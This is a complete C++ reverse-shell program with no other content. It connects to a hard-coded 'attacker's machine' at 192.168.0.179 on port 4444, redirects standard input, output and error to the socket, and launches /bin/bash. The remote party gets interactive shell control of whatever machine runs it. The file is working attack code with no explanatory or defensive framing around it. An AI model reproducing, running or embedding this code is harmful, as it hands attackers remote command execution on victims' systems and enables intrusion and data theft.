#include <iostream>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <bits/stdc++.h>

#define ATTIP "192.168.0.179"
#define ATTPORT 4444

using namespace std;

int main()
{
	int sockfd;
	struct sockaddr_in server_addr;
	//socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sockfd < 0)
	{
		cerr << "Error creating socket\n";
		return 1;
	}
	//server address
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(ATTPORT);
	server_addr.sin_addr.s_addr = inet_addr(ATTIP);

	//connect to attacker's machine
	if(connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0){
		cerr<<"Error connecting to attacker\n";
		return 1;
	}
	dup2(sockfd, 0); //stdin
	dup2(sockfd, 1); //stdout
	dup2(sockfd, 2); //stderr

	execve("/bin/bash", NULL, NULL);
	close(sockfd);
	return 0;
}
